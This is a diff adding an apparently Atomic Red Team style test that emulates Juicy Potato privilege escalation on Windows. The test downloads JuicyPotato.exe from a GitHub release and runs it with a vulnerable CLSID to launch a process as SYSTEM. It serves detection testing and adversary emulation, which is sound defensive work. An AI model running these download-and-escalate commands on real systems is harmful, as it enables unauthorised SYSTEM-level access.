@@ -87,3 +87,46 @@ atomic_tests:
       taskkill /f /im notepad.exe
     name: powershell
     elevation_required: true
+- name: Juicy Potato
+  auto_generated_guid: f095e373-b936-4eb4-8d22-f47ccbfbe64a
+  description: |-
+    This Atomic utilizes Juicy Potato to obtain privilege escalation. 
+    Upon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.
+    This tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. 
+    [Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    potato_path:
+      description: 'Path to the JuicyPotato.exe file'
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe 
+    listening_port:
+      description: 'COM server listen port'
+      type: integer
+      default: 7777
+    target_exe:
+      description: 'Target executable to launch with system privileges'
+      type: path
+      default: $env:windir\system32\notepad.exe
+    target_CLSID:
+      description: 'Vulnerable CLSID to impersonate privileges'
+      type: string
+      default: '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      JuicyPotato.exe must exist on disk
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe" "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+  executor:
+    command: |
+      cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'
+    cleanup_command: |
+      get-ciminstance Win32_Process | where-object { $_.Path -eq "#{target_exe}" } | invoke-cimmethod -methodname "terminate" | out-null
+      get-ciminstance Win32_Process | where-object { $_.Path -eq "#{potato_path}" } | invoke-cimmethod -methodname "terminate" | out-null
+    name: powershell
+    elevation_required: true
